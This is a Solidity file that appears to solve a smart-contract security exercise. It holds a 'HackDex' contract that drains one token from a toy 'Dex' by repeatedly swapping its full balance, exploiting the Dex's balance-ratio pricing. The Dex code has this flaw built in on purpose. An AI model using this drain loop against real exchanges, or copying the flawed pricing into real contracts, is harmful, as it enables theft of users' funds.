// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
contract HackDex {
    address public dexAddress;
    address public token1;
    address public token2;

    constructor(address _dex, address _t1, address _t2) {
        dexAddress = _dex;
        token1 = _t1;
        token2 = _t2;
    }
    function attackDex() external {
        console.log("log 1");
        Dex dex = Dex(dexAddress);
        uint tokenBal1;
        uint tokenBal2;
        uint amount = dex.balanceOf(token1, address(this));
        bool stopSwap = false;
        address from = token1;
        address to = token2;
        while(!stopSwap){
            console.log("log 2");
            console.log(" T1: T2", tokenBal1, tokenBal2);
            stopSwap = swap(from, to, amount, dex);
            if(!stopSwap) {
                console.log("log 5");
                tokenBal1 = dex.balanceOf(token1, address(this));
                tokenBal2 = dex.balanceOf(token2,address(this));
                if(tokenBal1 > tokenBal2) {
                    amount = tokenBal1;
                    from = token1;
                    to = token2;
                } else {
                    amount = tokenBal2;
                    from = token2;
                    to = token1;
                }
            }

        }
    }

    function swap(address from, address to, uint amount, Dex dex) private returns (bool) {
        console.log("log 3");
        bool stopSwap = false;
        uint swapPrice = dex.getSwapPrice(from, to, amount);
        uint toBalance = dex.balanceOf(to, dexAddress);
        console.log("address(this): ", dexAddress);
        console.log("to: ", to);
        console.log("swapPrice: ", swapPrice);
        console.log("toBalance: ", toBalance);
        if(swapPrice >= toBalance) {
            console.log("log 4");
            amount = dex.balanceOf(from, dexAddress);
            stopSwap = true;
        }
        console.log("amount: ", amount);
        dex.approve(dexAddress, amount);
        console.log("approved");
        dex.swap(from, to, amount);
        console.log(" FROM : TO", dex.balanceOf(from, dexAddress), dex.balanceOf(to, dexAddress));
        return stopSwap;
    }
}
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    console.log("swap 1");
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    console.log("swap 2", msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    console.log("swap 3", swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    console.log("swap 4");
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}